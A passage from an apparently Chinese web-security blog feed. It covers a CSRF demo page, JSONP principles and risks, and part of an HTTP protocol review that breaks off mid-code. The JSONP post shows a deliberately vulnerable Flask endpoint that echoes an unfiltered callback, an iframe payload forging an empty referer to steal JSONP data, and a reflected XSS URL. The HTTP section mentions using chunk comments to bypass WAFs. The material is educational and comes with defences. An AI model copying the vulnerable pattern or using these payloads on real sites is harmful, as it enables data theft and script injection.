class="title">json2</span><span class="params">()</span>:</span></span><br><span class="line">    template = <span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Normal&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt; Reset Password &lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">    $(document).ready(function()&#123;</span></span><br><span class="line"><span class="string">      $("button").click(function()&#123;</span></span><br><span class="line"><span class="string">        // body为"data=json"的请求</span></span><br><span class="line"><span class="string">        // var data = &#123;data: JSON.stringify(&#123;"action": "reset password"&#125;)&#125;</span></span><br><span class="line"><span class="string">        // body直接为json</span></span><br><span class="line"><span class="string">        var data = JSON.stringify(&#123;"action": "reset password"&#125;)</span></span><br><span class="line"><span class="string">        $.ajax(&#123;</span></span><br><span class="line"><span class="string">            url:"http://127.0.0.1:8888/json",</span></span><br><span class="line"><span class="string">            contentType: "application/json",</span></span><br><span class="line"><span class="string">            headers:&#123;'X-CSRFToken':$.cookie('csrf_token')&#125;,</span></span><br><span class="line"><span class="string">            dataType: "json",</span></span><br><span class="line"><span class="string">            type: 'POST',</span></span><br><span class="line"><span class="string">            data: data,</span></span><br><span class="line"><span class="string">            success: function (msg) &#123;</span></span><br><span class="line"><span class="string">                        alert(msg.status);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">            &#125;)</span></span><br><span class="line"><span class="string">      &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;button&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>CSRF-Scanner——打造全自动检测CSRF漏洞利器，<a href="https://security.tencent.com/index.php/blog/msg/24" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/24</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CSRF成因&quot;&gt;&lt;a href=&quot;#CSRF成因&quot; class=&quot;headerlink&quot; title=&quot;CSRF成因&quot;&gt;&lt;/a&gt;CSRF成因&lt;/h1&gt;&lt;h2 id=&quot;GET型&quot;&gt;&lt;a href=&quot;#GET型&quot; class=&quot;headerlink&quot; title=&quot;G
      
    
    </summary>
    
      <category term="Web安全-CSRF" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-CSRF/"/>
    
    
      <category term="Web安全" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSRF" scheme="http://anemone.top/tags/CSRF/"/>
    
      <category term="防御" scheme="http://anemone.top/tags/%E9%98%B2%E5%BE%A1/"/>
    
  </entry>
  
  <entry>
    <title>JSONP原理及其安全性问题</title>
    <link href="http://anemone.top/jsonp-JSONP%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/"/>
    <id>http://anemone.top/jsonp-JSONP原理及其安全性问题/</id>
    <published>2019-02-04T06:50:30.000Z</published>
    <updated>2019-09-22T10:14:18.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JSONP原理"><a href="#JSONP原理" class="headerlink" title="JSONP原理"></a>JSONP原理</h1><p>JSONP（JSON with Padding）是一种跨域获取数据的方法，因为带<code>src</code>属性的标签如<code>&lt;script&gt;</code>允许跨域（1. 在CSP没有设置的情况下, 2.跨域时是可以带cookie的），因此前端可以设置一个callback请求并生成一个访问后台某个<code>&lt;script&gt;</code>的链接，后台在链接中动态的将数据包裹在先前的callback函数中，作为参数返回给前台，这样就完成了跨域获取数据的效果。</p><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">'random_secret_key'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/remote.js', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span><span class="params">()</span>:</span></span><br><span class="line">    _id=int(request.args.get(<span class="string">"id"</span>))</span><br><span class="line">    <span class="comment"># fetch data from database...</span></span><br><span class="line">    user=[</span><br><span class="line">        dict(username=<span class="string">"zhangsan"</span>,stat=<span class="string">"student"</span>),</span><br><span class="line">        dict(username=<span class="string">"lisi"</span>,stat=<span class="string">"working"</span>),</span><br><span class="line">        dict(username=<span class="string">"wangwu"</span>,stat=<span class="string">"student"</span>),</span><br><span class="line">    ]</span><br><span class="line">    callback=request.args.get(<span class="string">"callback"</span>)</span><br><span class="line">    json_data=json.dumps(user[_id])</span><br><span class="line">    template=<span class="string">"&#123;&#123;callback&#125;&#125;(&#123;&#123;json_data&#125;&#125;)"</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, callback=callback, json_data=json_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样，加入我们访问<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，那么会得到如下结果：" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，那么会得到如下结果：</a></p><p><img src="/jsonp-JSONP原理及其安全性问题/1549265659864.png" alt="1549265659864"></p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p>那么前端就可以嵌入一个<code>&lt;script&gt;</code>标签，其中<code>src</code>设置为<a href="http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，以此获取数据：" target="_blank" rel="noopener">http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback，以此获取数据：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 得到查询结果后的回调函数</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> mycallback = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:8888/remote.js?id=1&amp;callback=mycallback"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到获取数据成功：</p><p><img src="/jsonp-JSONP原理及其安全性问题/1549266866289.png" alt="1549266866289"></p><p>同时给出jQuery的版本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"get"</span>,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        url: <span class="string">"http://127.0.0.1:8888/remote.js?id=1"</span>,</span><br><span class="line">        dataType: <span class="string">"jsonp"</span>,</span><br><span class="line">        jsonp: <span class="string">"callback"</span>,<span class="comment">//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span></span><br><span class="line">        jsonpCallback:<span class="string">"mycallback"</span>,<span class="comment">//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写"?"，jQuery会自动为你处理数据</span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'username: '</span> + data.username + <span class="string">', status: '</span>+ data.stat);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'fail'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="JSONP的安全性问题"><a href="#JSONP的安全性问题" class="headerlink" title="JSONP的安全性问题"></a>JSONP的安全性问题</h1><h2 id="JSON劫持导致CSRF"><a href="#JSON劫持导致CSRF" class="headerlink" title="JSON劫持导致CSRF"></a>JSON劫持导致CSRF</h2><p>主要表现为后台没有做身份认证，导致任何前台都可以发送JSONP请求，若请求中存在敏感信息则会发生信息泄露（相当于CSRF）。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>使用referer过滤，对于空referer不予以放行</li><li>增加一个随机token</li></ol><p>可以看到整体的防御方法类似于CSRF的防御方法。</p><h3 id="空referer"><a href="#空referer" class="headerlink" title="空referer"></a>空referer</h3><p>进行基于referer的防御时，对于空referer的情况应不予以放行，因为攻击者可以使用某些标签（<code>iframe</code>）构造空referer。Payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function callback(o)&#123;alert(o.username);&#125;&lt;/script&gt;&lt;script src=http://127.0.0.1:8888/remote.js?id=1&amp;callback=callback&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="自定义Callback导致XSS"><a href="#自定义Callback导致XSS" class="headerlink" title="自定义Callback导致XSS"></a>自定义Callback导致XSS</h2><p>比如说本文的实例，攻击者可以构造如下链接导致反射型XSS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/remote.js?id=1&amp;callback=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>定义Content-Type: application/json</li><li>对XSS字符进行能过滤</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JSONP原理&quot;&gt;&lt;a href=&quot;#JSONP原理&quot; class=&quot;headerlink&quot; title=&quot;JSONP原理&quot;&gt;&lt;/a&gt;JSONP原理&lt;/h1&gt;&lt;p&gt;JSONP（JSON with Padding）是一种跨域获取数据的方法，因为带&lt;code&gt;src&lt;
      
    
    </summary>
    
      <category term="Web安全-JSONP" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-JSONP/"/>
    
    
      <category term="javascript" scheme="http://anemone.top/tags/javascript/"/>
    
      <category term="同源" scheme="http://anemone.top/tags/%E5%90%8C%E6%BA%90/"/>
    
      <category term="JSONP" scheme="http://anemone.top/tags/JSONP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议复习</title>
    <link href="http://anemone.top/HTTP-HTTP%E5%8D%8F%E8%AE%AE%E5%A4%8D%E4%B9%A0/"/>
    <id>http://anemone.top/HTTP-HTTP协议复习/</id>
    <published>2019-01-31T09:25:42.000Z</published>
    <updated>2019-09-22T10:14:18.556Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h1><ul><li><p>GET 用于获取数据<del>，无请求body</del></p></li><li><p>POST 用于添加数据</p><p>其content-type不同，body中的格式也不同</p></li><li><p>PUT 用于添加或更新数据</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/new.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: example.com</span><br><span class="line"><span class="attribute">Content-type</span>: text/html</span><br><span class="line"><span class="attribute">Content-length</span>: 16</span><br><span class="line"></span><br><span class="line">&lt;p&gt;New File&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>Response:</p><p>若资源不存在需要创建，那么服务器需响应<code>201</code>表明内容已创建：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Content-Location</span>: /new.html</span><br></pre></td></tr></table></figure><p>若资源存在则返回<code>200</code>或<code>204</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /existing.html</span><br></pre></td></tr></table></figure></li><li><p>PATCH 用于更新数据</p><p>Request:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATCH /file.html HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span>: www.example.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/example</span><br><span class="line"><span class="attribute">If-Match</span>: "e0023aa4e"</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"></span><br><span class="line">&#123;"op":"move", "from":"/a/b/c", "to":"/a/b/d"&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><p>正确回应应该为<code>204</code>因为<code>200</code>会带返回body</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">204</span> No Content</span><br><span class="line"><span class="attribute">Content-Location</span>: /file.txt</span><br><span class="line"><span class="attribute">ETag</span>: "e0023aa4f"</span><br></pre></td></tr></table></figure></li><li><p>DELETE 用于删除数据</p><p>Request：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/file.html</span> HTTP/1.1</span><br></pre></td></tr></table></figure><p>Response:</p><p><code>202</code>已经接受但操作未执行完，<code>204</code>或者<code>200</code>(需返回body)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Wed, 21 Oct 2015 07:28:00 GMT</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>File deleted.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>HEAD 用于获取GET请求的响应头<del>，无请求body</del></p></li><li><p>OPTIONS 用于描述通信选项，如CORS使用或者获取服务器所支持的方法</p></li><li><p>TRACE 回显服务器收到的请求</p></li></ul><p><strong>19/08/28更新：</strong>经过大佬纠正，<a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a>3.3节明确指出任何请求都可以带body，而developer.mozilla那边写错了。</p><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>幂等性：不论进行多少次操作，都返回相同的结果。</p><p>安全性（Safe）：方法不改变资源，可以理解为只读性。</p><div class="table-container"><table><thead><tr><th></th><th>GET</th><th>POST</th><th>PUT</th><th>PATCH</th><th>DELETE</th><th>HEAD</th><th>OPTIONS</th><th>TRACE</th></tr></thead><tbody><tr><td>请求含body</td><td>N</td><td>Y</td><td>Y</td><td>Y</td><td>May</td><td>N</td><td>N</td><td>N</td></tr><tr><td>回应含body</td><td>Y</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>N</td><td>Y</td><td>N</td></tr><tr><td>安全性</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>幂等性</td><td>Y</td><td>N</td><td>Y</td><td>May</td><td>Y</td><td>Y</td><td>Y</td><td>N</td></tr><tr><td>可缓存</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>Y</td><td>N</td><td>N</td></tr><tr><td>可以被表单使用</td><td>Y</td><td>Y</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td><td>N</td></tr></tbody></table></div><h2 id="POST、PUT和PATCH的区别"><a href="#POST、PUT和PATCH的区别" class="headerlink" title="POST、PUT和PATCH的区别"></a>POST、PUT和PATCH的区别</h2><p>用法区别：</p><ul><li>POST用于创建资源</li><li>PUT用于创建或更新资源</li><li>PATCH用于更新资源（与PUT不同的是PATCH的body部分必须包含<strong>对象需要更新的属性新的值</strong>并且可能包含<strong>旧的值</strong>，而PUT需要包含<strong>对象的所有必须(包括新的和旧的)属性</strong>）注意这决定了PATCH不能保证幂等性，下文会详细讨论。</li></ul><p>幂等性区别：</p><ul><li>POST是不幂等的，例如<code>POST /api/create/user/a</code>为创建一个用户a，再次POST则对再次创建（即使先前存在一个重复数据）。</li><li><p>PUT是幂等的，即存在则更新，不存在则创建。</p></li><li><p>PATCH的设计有可能幂等——body部分只包含更新后的值，比如（<code>{&quot;name&quot;:&quot;newname&quot;}</code>)，也有可能是不幂等的——body部分包含了更新前的值和更新后的值，比如（<code>{&quot;op&quot;:&quot;rename&quot;,&quot;oldname&quot;:&quot;Old&quot;，”newname&quot;,&quot;New&quot;}</code>）第二次执行时，因为oldname已经不为”Old“，所以会抛出异常。</p></li></ul><p>当然这只是规范的设计，在实际应用中，由于开发者素质和业务场景的不同，很可能打破这些请求的原有功能，比如很多情况下用POST代替了PUT和PATCH。</p><h1 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h1><p>只列举常用的</p><h2 id="信息响应"><a href="#信息响应" class="headerlink" title="信息响应"></a>信息响应</h2><p><code>101 switching Protocol</code></p><p>服务器将用Upgrade通知客户端采用不同协议完成这个请求</p><h2 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h2><p><code>200 OK</code></p><p>请求成功</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p><code>301 Moved Permanently</code></p><p>永久重定向</p><p><code>302 Found</code></p><p>请求的资源现在临时从不同的 URI 响应请求。</p><h2 id="客户端问题"><a href="#客户端问题" class="headerlink" title="客户端问题"></a>客户端问题</h2><p><code>400 Bad Request</code></p><p>语意有错误或请求参数有误</p><p><code>401 Unauthorized</code></p><p>当前请求需要用户验证</p><p><code>403 Forbidden</code></p><p>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。</p><p><code>404 Not Found</code></p><p>请求失败，请求所希望得到的资源未被在服务器上发现。</p><p><code>408 Request Timeout</code></p><p>请求超时</p><h2 id="服务器错误"><a href="#服务器错误" class="headerlink" title="服务器错误"></a>服务器错误</h2><p><code>500 Internal Server Error</code></p><p>服务器遇到了不知道如何处理的情况</p><p><code>502 Bad Gateway</code></p><p>上游服务器（如tomcat、php-fpm）的响应是无效的</p><p><code>503 Service Unavailable</code></p><p>服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机</p><p><code>504 Gateway Timeout</code></p><p>当服务器作为网关，不能及时得到响应时返回此错误代码。</p><h1 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h1><p>HTTP的首部说不完，只列举与安全有关的，值得注意的是<code>x-</code>开头的头部为自定义头部，这在2012年6月已经被RFC废止。</p><h2 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h2><p>用于不同域名配置在同一个IP地址的服务器上，web容器（如nginx）通过该字段转发请求。</p><h2 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h2><p>对于持续连接来说，使用Content-Lenght来定义http报文边界。</p><h2 id="Transfer-Encoding-chunked"><a href="#Transfer-Encoding-chunked" class="headerlink" title="Transfer-Encoding: chunked"></a>Transfer-Encoding: chunked</h2><p>分块传输，将报文分块发送，这样发送方不需要一次性计算http长度。</p><p>每个分块包含一个十六进制数据表示数据长度和数据部分，用CLRF(\r\n)结尾；最后一个分块长度为0表示结束；<code>;</code>表示注释，可以用来绕过WAF</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">25\r\n</span></span><br><span class="line">This is the data in the first chunk\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">1C\r\n</span></span><br><span class="line">and this is the second one\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">3;xxxx\r\n</span></span><br><span class="line"><span class="attribute">con\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">8\r\n</span></span><br><span class="line"><span class="attribute">sequence\r\n</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">(两个换行)</span></span><br></pre></td></tr></table></figure><h2 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h2><p>用于防御UI点击劫持，它是指攻击者改造网页，在网页前加入一个透明的iframe框诱惑攻击者点击，格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Frame-Options: DENY | SAMEORIGIN | ALLOW-FROM URL</span><br></pre></td></tr></table></figure><p>目前已经被CSP取代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;none&apos;;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;self&apos;;</span><br></pre></td></tr></table></figure><h2 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h2><p>用于防御反射型XSS，默认配置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection: 1</span><br></pre></td></tr></table></figure><p>表示开启XSS防御，0表示关闭。</p><h2 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h2><p>HSTS指示浏览器强制使用HTTPS，它的头部为Strict-Transport-Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: &lt;max-age=31536000&gt;[; includeSubDomains][; preload]</span><br></pre></td></tr></table></figure><p><code>max-age</code>指HSTS的过期时间，通常是一年</p><p><code>includeSubDomains</code>指当前域名和子域名均开启HSTS</p><p><code>preload</code>指申请将该域名加入浏览器内置列表中，以后的所有访问都将使用https链接（可以在<a href="https://hstspreload.org/上看）" target="_blank" rel="noopener">https://hstspreload.org/上看）</a></p><p>详细解释一下，若不加HSTS，那么用户的访问是这样的：</p><p><img src="/HTTP-HTTP协议复习/1549094565896.png" alt="1549094565896"></p><p>因此攻击者可以展开中间人攻击：</p><p><img src="/HTTP-HTTP协议复习/1549094607660.png" alt="1549094607660"></p><p>使用HSTS防御后用户可以防御该攻击：</p><p><img src="/HTTP-HTTP协议复习/1549094654080.png" alt="1549094654080"></p><h2 id="HPKP"><a href="#HPKP" class="headerlink" title="HPKP"></a>HPKP</h2><p>为了防止CA悄悄修改证书内容，服务器可以将自己公钥填在HTTP头中，让浏览器核对其与证书是否一致：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Public-Key-Pins: pin-sha256=&quot;base64==&quot;; max-age=expireTime [; includeSubdomains][; report-uri=&quot;reportURI&quot;]</span><br></pre></td></tr></table></figure></p><h2 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer-Policy"></a>Referrer-Policy</h2><p><code>Referer: A.com</code> 指跳转来自A.com<br>默认情况下，只要发生跳转，浏览器就会自动添加referer头，服务器可以用<code>referer-prolicy</code>指定为其他：</p><div class="table-container"><table><thead><tr><th>值</th><th>介绍</th></tr></thead><tbody><tr><td>空</td><td>Policy未设置</td></tr><tr><td>no-referrer</td><td>任何情况下都不发送referer</td></tr><tr><td>no-referrer-when-downgrade</td><td>https至http时不发送referer</td></tr><tr><td>origin</td><td>仅发送protocal://host部分</td></tr><tr><td>origin-when-cross-origin</td><td>跨域时发送origin</td></tr><tr><td>same-origin</td><td>同源时发送</td></tr><tr><td>strict-origin</td><td>双方origin相同且安全等级相同</td></tr><tr><td>unfafe-url</td><td>任何情况下都发送完整referer</td></tr></tbody></table></div><h2 id="关于请求IP"><a href="#关于请求IP" class="headerlink" title="关于请求IP"></a>关于请求IP</h2><ul><li><p><code>Client-IP</code>：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Forwarded-For</code>：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br></pre></td></tr></table></figure></li><li><p><code>X-Originating-IP</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 